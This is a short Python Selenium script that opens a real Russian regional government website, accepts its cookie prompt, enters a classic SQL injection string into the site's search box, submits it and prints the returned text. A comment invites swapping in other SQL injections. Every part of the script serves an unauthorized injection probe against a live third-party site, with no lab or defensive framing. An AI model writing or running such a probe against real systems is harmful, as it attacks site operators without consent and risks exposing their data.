from selenium.webdriver import Firefox
from time import sleep

def main():
	browser = Firefox()

	browser.maximize_window()
	browser.implicitly_wait(5)

	browser.get("https://rk.gov.ru/")

	browser.find_element_by_id("acceptCookies").click()

	sql = """SELECT * FROM database WHERE id="OR 1 = 1--" """
	#search_text = input()#либо другию sql-инъекции


	def test(sql):
		
		search = browser.find_element_by_css_selector(".bottom-nav__pole")
		browser.execute_script("return arguments[0].scrollIntoView(true);",search )
		sleep(1)
		search.send_keys(sql)
		browser.find_element_by_css_selector(".bottom-nav__button").click()
		
		print(browser.find_element_by_xpath("//p[2]").text)



	test(sql)

	browser.close()

if __name__ == '__main__':
	main()
